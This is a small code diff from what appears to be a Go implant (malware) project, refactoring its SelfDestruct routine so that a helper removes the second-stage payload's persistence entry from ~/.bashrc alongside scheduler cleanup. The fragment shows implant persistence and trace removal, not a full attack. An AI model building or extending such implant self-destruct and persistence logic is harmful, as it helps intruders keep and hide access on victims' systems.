@@ -184,20 +184,8 @@ func (i *Implant) SelfDestruct() {
 	scheduler.RemoveByTags()
 
 	// remove entries in .bashrc
-	// removeSubstr(bashrc, stage_2_path)
-	// commented out because this might be overkill
 	bashrc := "~/.bashrc"
-	content, err := os.ReadFile(bashrc)
-	if err != nil {
-		panic(err)
-	}
-	strContent := string(content)
-	modifiedContent := strings.ReplaceAll(strContent, stage_2_path, "")
-	err = os.WriteFile(bashrc, []byte(modifiedContent), 0644)
-	if err != nil {
-		panic(err)
-	}
-
+	removeSubstr(bashrc, stage_2_path)
 }
 
 func removeSubstr(path, substr string) error {
